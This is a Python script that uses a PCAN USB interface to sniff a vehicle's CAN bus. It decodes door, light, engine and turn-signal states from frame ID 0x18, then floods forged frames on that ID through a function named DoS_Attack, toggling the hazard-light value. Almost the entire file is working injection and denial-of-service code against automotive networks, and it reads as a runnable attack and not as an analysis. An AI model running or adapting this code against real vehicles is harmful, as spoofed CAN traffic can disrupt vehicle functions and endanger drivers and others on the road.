from PCANBasic import *
import time
import os

unused_bits = {'0165': [3, '00'], '051A': [0, '00'], '02B0': [3, '07'], '00A0': [6, '00'],
 '05E4': [0, '00'], '0153': [4, '00'], '02A0': [1, '00'], '0120': [0, '00'], '043F': [2, '60'],
 '0316': [7, '7F'], '04B1': [4, '00'], '0050': [0, '00'], '0164': [0, '00'], '0018': [6, '20'],
 '0044': [0, '00'], '0110': [0, 'E0'], '05F0': [0, '00'], '0329': [7, '10'], '0440': [3, '00'],
 '00A1': [2, '80'], '04F2': [4, '00'], '018F': [6, '00'], '0382': [0, '40'], '04F0': [0, '00'],
 '05A2': [0, '25'], '0034': [0, '00'], '0260': [3, '30'], '01F1': [0, '00'], '02C0': [0, '3D'],
 '0517': [1, '00'], '05A0': [0, '00'], '0080': [1, '17'], '04F1': [2, '00'], '0043': [0, '00'],
 '0350': [5, '00'], '059B': [0, '00'], '0081': [3, '00'], '0042': [1, 'FF'], '0510': [0, '00'],
 '0690': [0, '03'], '0587': [0, '00'], '0370': [0, 'FF']}

msg_dict = {
    0: [["00", "10", "08"], ["Door is Closed", "Door is Open", "Seat Belt is Off"]],
    1: [["00", "02"], ["Mid Range Light is Off", "Mid Range Light is On"]],
    2: [["00", "01", "03"], ["Long Range Light is Off", "Long Range Light is On", "Far Light Is On"]],
    3: [["10","50", "70", "60"], ["Engine is off", "Engine is Loading", "Engine is On/Brake on", "Engine is On/Brake Off"]],
    4: [["00", "01"], ["Small Light is Off", "Small Light is On"]],
    5: [["00", "20", "40", "60"], ["Light is Off", "Turn Right Light is On", "Turn Left Light is On", "Emergency Light is On"]],
    7: [["00", "10"], ["Seat Belt is On", "Seat Belt is Off"]]
}

using_bytes = ["00", "00", "00", "00", "00", "00", "20", "00"]

cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']



def DoS_Attack(id, data):
    all_datas = ""
    Fuzzing_ID = int(id, 16)

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = Fuzzing_ID
    DoS_DATA.LEN = len(data)
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    check_ind = unused_bits[id][0]
    check_val = unused_bits[id][1]
    for i in range(len(data)):
        if check_ind == i and check_val == data[i]:
            DoS_DATA.DATA[i] = int(data[i], 16) + 2
        else:
            DoS_DATA.DATA[i] = int(data[i], 16)
        all_datas += str(DoS_DATA.DATA[i]) + "\t"
        # all_datas += data[i]+ "\t"

    print(all_datas)
    CAN.Write(CAN_BUS, DoS_DATA)
    # time.sleep(time_offset)

if __name__ == "__main__":
    CAN = PCANBasic()                            #CANi
    CAN_BUS = PCAN_USBBUS6
    counter = 0
    start_time = time.time()
    ind = 0
    injected = False
    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    if result != PCAN_ERROR_OK:
        # An error occurred, get a text describing the error and show it
        #
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
    while True:
        # print("PCAN-USB Pro FD (Ch-1) was initialized")
        mess = CAN.Read(CAN_BUS)
        if hex(mess[1].ID) != "0x0":
            if hex(mess[1].ID) == "0x18":
                all_data = str(ind) + ')' + "\t"
                offset = (time.time() - start_time)*1000
                all_data += "{:.1f}".format(offset) + "\t"
                id_hex = hex(mess[1].ID)[2:]
                for _ in range(4 - len(id_hex)):
                    id_hex = '0' + id_hex.upper()
                for j in range(mess[1].LEN):
                    data_hex = hex(mess[1].DATA[j])[2:]
                    if j in msg_dict.keys():
                        for _ in range(2 - len(data_hex)):
                            data_hex = '0' + data_hex.upper()
        
                        temp_val = data_hex
                        temp_ind = msg_dict[j][0].index(temp_val)
                        print(j, end=": ")
                        print(msg_dict[j][1][temp_ind])
                        if temp_val != using_bytes[j]:
                            using_bytes[j] = temp_val
                        print(using_bytes)
                all_data += "\t" + data_hex.upper()
                all_data += "\n"
                time.sleep(0.1)
                os.system("cls")
        if time.time() - start_time > 1:
            os.system("cls")
            print("Phase #1 has done")
            break
    cnt_b = 0
    while True:
        injection_id = "0018"
        mess = CAN.Read(CAN_BUS)
        k = 10
        if hex(mess[1].ID) == "0x18":
        # if 0 == 0:
            cnt_b += 1
            if cnt_b > 30:
                print("Bye Bye")
                break
            first_injection = True
            for cnt in range(10):
                time.sleep(0.03/k)
                if cnt % 2 == 0:       
                    using_bytes[5] = msg_dict[5][0][3]
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                if cnt % 4 == 1:
                    using_bytes[5] = msg_dict[5][0][0]
                    injected = False
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                if cnt % 4 == 3:
                    using_bytes[5] = msg_dict[5][0][0]
                    injected = False
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
                    time.sleep(0.03/k)
                    DoS_Attack(injection_id, using_bytes)
            print("Cycle ends #{0}".format(cnt_b))
            time.sleep(0.5)